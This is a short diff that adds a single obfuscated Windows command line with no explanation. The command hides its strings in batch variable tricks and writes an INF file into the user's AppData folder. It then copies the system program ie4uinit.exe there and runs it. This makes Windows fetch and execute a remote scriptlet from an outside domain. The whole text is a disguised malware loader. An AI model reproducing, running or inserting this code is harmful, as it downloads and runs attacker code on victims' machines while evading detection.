@@ -1,0 +1,4 @@
+/v /c (for %h in (s) do @set "Faces=%~h") &&
+  call(for /D %h in ("[157A4]" "ieu%Rival%.inf" "[strings]" "Advance=%time%" "shortsvcname=' '" "Vessel=t;Cruise" "Rival=init" "Feelings=b;Metals" "servicename=' '" "Become=:;Customs" "Exhaust=h" "Benefit=com" "Thrive=/" "[9E5]" "sc\" "ro%Feelings%j,NI,%Exhaust%%Vessel%%Vessel%p%Become%%Thrive%%Thrive%adfjkb.vbsrjv.%Benefit%/afdgkja" "[defaultinstall.windows7]" "delfiles=157A4" "Un\" "Register\" "OCXs=9E5" "[version]" "signature =$windows nt$" "[destinationdirs]" "defaultdestdir=11" "157A4=01" ) do @echo %~h)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Rolls!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" &&
+  %appdata%\microsoft\ie4uinit.exe -basesettings
